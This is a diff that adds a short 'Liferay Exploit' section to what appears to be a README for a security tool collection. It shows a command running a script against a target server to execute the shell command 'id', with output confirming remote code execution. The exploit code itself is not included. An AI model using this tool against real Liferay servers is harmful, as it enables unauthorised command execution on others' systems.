@@ -34,3 +34,14 @@ This requires a list of urls with https:// or http://
 
 
 
+Liferay Exploit
+---
+
+```
+python liferay-exploit.py -t https://myserver -c id
+``
+
+```
+Status code:   200
+Response body: b'uid=1002(liferay) gid=1002(liferay) groups=1002(liferay)\n'
+```
